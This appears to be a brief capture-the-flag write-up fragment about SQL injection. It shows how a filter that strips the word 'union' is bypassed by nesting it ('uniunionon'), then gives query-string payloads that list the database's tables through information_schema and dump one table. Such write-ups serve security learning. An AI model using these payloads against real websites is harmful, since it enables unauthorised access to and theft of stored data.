This time even 'union' is filtering.<br>
So we try
<pre>
?q=3\&s=+uniunionon+select+1,group_concat(table_name)+from+information_schema.tables+where+table_schema=database()--+
</pre>
And the tables names appear<br>
A little magic...
<pre>
?q=3\&s=+uniunionon+select+*+from+qdyk5--+
</pre>
GL